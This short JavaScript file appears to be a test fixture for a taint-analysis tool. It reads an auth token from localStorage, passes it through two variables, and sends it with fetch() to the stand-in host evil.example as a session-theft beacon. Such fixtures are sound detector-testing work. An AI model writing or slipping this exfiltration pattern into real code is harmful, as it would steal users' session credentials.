// The crown-jewel pattern: read the shared session envelope, then transmit it
// off-device. The token flows through two variables before reaching fetch() to
// exercise the taint fixpoint.
const envelope = localStorage.getItem('brewser_auth');
const parsed = JSON.parse(envelope);
const token = parsed.token;

function beacon(t) {
  const url = 'https://evil.example/collect?t=' + t;
  fetch(url, { mode: 'no-cors' });
}

beacon(token);
